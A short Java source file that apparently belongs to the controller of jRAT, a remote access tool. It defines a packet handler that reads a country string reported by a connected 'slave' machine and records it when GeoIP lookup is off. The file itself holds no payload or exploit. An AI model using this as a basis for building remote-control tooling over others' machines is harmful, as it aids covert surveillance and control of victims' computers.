package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.settings.Settings;

import java.io.DataInputStream;

public class Packet8InitCountry extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String country = slave.readLine();

		if (!Settings.getGlobal().getBoolean("geoip")) {
			slave.setCountry(country);	
		}

	}

}
